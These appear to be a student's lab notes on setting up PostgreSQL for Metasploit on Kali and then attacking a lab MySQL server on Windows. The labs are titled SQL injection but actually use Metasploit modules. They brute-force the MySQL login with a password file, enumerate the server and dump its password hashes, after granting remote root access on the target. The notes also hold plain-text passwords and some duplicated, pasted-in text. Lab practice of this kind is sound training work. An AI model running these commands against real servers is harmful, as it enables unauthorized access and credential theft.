# Section 1: 

- Start PostgreSQL:
  ```bash
  sudo /etc/init.d/postgresql start
  ```
  - Reinstall PostgreSQL if necessary (due to missing database.yml in the directory /usr/share/metasploit-framework/config/database.yml):
    ```bash
    sudo apt install postgresql postgresql
    ```
  - Enable and restart PostgreSQL:
    ```bash
    sudo systemctl enable postgresql
    sudo systemctl restart postgresql
    ```
  - Verify PostgreSQL status:
    ```bash
    sudo systemctl status postgresql
    ```
  - Switch to postgres user and access PostgreSQL:
    ```bash
    sudo su - postgres
    psql -p 5433
    \du   # Check if 'postgres' user exists and is a superuser
    alter user postgres with password 'admin@123';
    \l   # Check for a database named 'postgres'
    
- Start Metasploit
   ```bash
    /etc/init.d/metasploit start # (old method, won't work)
    ```
  - Instead, install Metasploit Framework:
    ```bash
    sudo apt install metasploit-framework
    ```
  -  if **sudo systemctl start metasploit** work do not do the following comands else do this:
      - Verify Metasploit paths:
        ```bash
        which msfconsole
        locate metasploit-framework
        ```
     - Adjust Metasploit service configuration if paths differ:
       ```bash
       sudo nano /etc/systemd/system/metasploit.service
       ```
       | [Unit]                                                 |        
       | Description=Metasploit Framework                       |
       | After=network.target                                   |
       |                                                        |
       | [Service]                                              |
       | Type=simple                                            |
       | ExecStart=/usr/local/bin/msfconsole                    |
       | User=root                                              |  
       | WorkingDirectory=/usr/local/share/metasploit-framework |
       |                                                        |
       | [Install]                                              |
       | WantedBy=multi-user.target                             |
       |                                                        |


ini
Copy code
[Unit]
Description=Metasploit Framework
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/msfconsole
User=root
WorkingDirectory=/usr/local/share/metasploit-framework

[Install]
WantedBy=multi-user.target
Start and verify Metasploit service:

bash
Copy code
sudo systemctl start metasploit
sudo systemctl status metasploit
Lab 3: SQL Injection with Metasploit
Start Metasploit console and wait for initialization:

bash
Copy code
msfconsole
Check database connection status:

bash
Copy code
db_status
If not connected, configure database connection:

bash
Copy code
db_connect –y /usr/share/metasploit-framework/config/database.yml
Resolve PostgreSQL configuration issues if encountered:

bash
Copy code
sudo nano /etc/postgresql/14/main/postgresql.conf
# Uncomment and adjust lines like:
# listen_addresses = 'localhost'
log_timezone = 'UTC'
TimeZone = 'UTC'

sudo nano /etc/postgresql/14/main/pg_hba.conf
# Ensure lines like:
# local all postgres peer
# local all all peer
# host all all 127.0.0.1/32 md5
Restart PostgreSQL:

bash
Copy code
sudo systemctl restart postgresql
Update Metasploit database configuration:

bash
Copy code
sudo nano /usr/share/metasploit-framework/config/database.yml
Example configuration:

yaml
Copy code
development:
  adapter: postgresql
  database: msf6
  username: msf6
  password: RIbJY72yN0T8mPaYaaT96NRF2b/VNXEjEMFqpxRIuhw=
  host: localhost
  port: 5432
  pool: 5
  timeout: 5
production:
  adapter: postgresql
  database: msf6
  username: msf6
  password: RIbJY72yN0T8mPaYaaT96NRF2b/VNXEjEMFqpxRIuhw=
  host: localhost
  port: 5432
  pool: 5
  timeout: 5
Create PostgreSQL database and user for Metasploit:

bash
Copy code
sudo su - postgres
psql -p 5433
CREATE DATABASE msf6;
CREATE USER msf6 WITH PASSWORD 'RIbJY72yN0T8mPaYaaT96NRF2b/VNXEjEMFqpxRIuhw=';
GRANT ALL PRIVILEGES ON DATABASE msf6 TO msf6;
Restart PostgreSQL and Metasploit:

bash
Copy code
sudo systemctl restart postgresql
sudo systemctl restart metasploit
Reconnect to Metasploit console and continue:

bash
Copy code
msfconsole
db_connect –y /usr/share/metasploit-framework/config/database.yml
Example commands inside Metasploit console:

bash
Copy code
use auxiliary/scanner/mysql/mysql_version
Lab 4: SQL Injection on Windows Server
Install MySQL server on Windows Server.

Open terminal and connect to MySQL:

bash
Copy code
mysql -u root -p
Set up MySQL users and permissions:

sql
Copy code
CREATE USER 'msf6'@'192.168.43.93' IDENTIFIED BY 'mounaMYSQL19';
GRANT ALL PRIVILEGES ON *.* TO 'msf6'@'192.168.43.93';
CREATE USER 'root'@'192.168.43.93' IDENTIFIED BY 'mounaMYSQL19';
GRANT ALL PRIVILEGES ON *.* TO 'root'@'192.168.43.93';
FLUSH PRIVILEGES;
Back to Kali, execute Metasploit commands:

bash
Copy code
msf6 auxiliary(scanner/mysql/mysql_version)
set RHOSTS 192.168.43.189
run

use auxiliary/scanner/mysql/mysql_login
set RHOSTS 192.168.43.189
set USERNAME root
set PASS_FILE /mouna19/passwords.txt
run
Additional Metasploit MySQL enumeration:

bash
Copy code
use auxiliary/admin/mysql/mysql_enum
set RHOSTS 192.168.43.189
set USERNAME root
set PASSWORD mounaMYSQL19
run

use auxiliary/scanner/mysql/mysql_hashdump
set RHOSTS 192.168.43.189
set USERNAME root
set PASSWORD mounaMYSQL19
run
Open another terminal window in Kali for MySQL console access:

bash
Copy code
mysql -u root -p -h 192.168.43.189
Enter the password (e.g., mounamySQL19) to access MySQL console.
